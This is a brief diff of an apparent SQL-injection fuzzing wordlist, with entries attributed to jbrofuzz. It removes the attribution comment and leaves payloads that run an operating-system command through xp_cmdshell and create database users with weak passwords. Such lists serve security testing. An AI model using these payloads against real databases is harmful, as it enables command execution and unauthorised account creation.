@@ -1,4 +1,3 @@
-# contains statements from jbrofuzz (13 April 2010)
 '; exec master..xp_cmdshell 'ping 10.10.1.2'--
 create user name identified by 'pass123'
 create user name identified by pass123 temporary tablespace temp default tablespace users; 
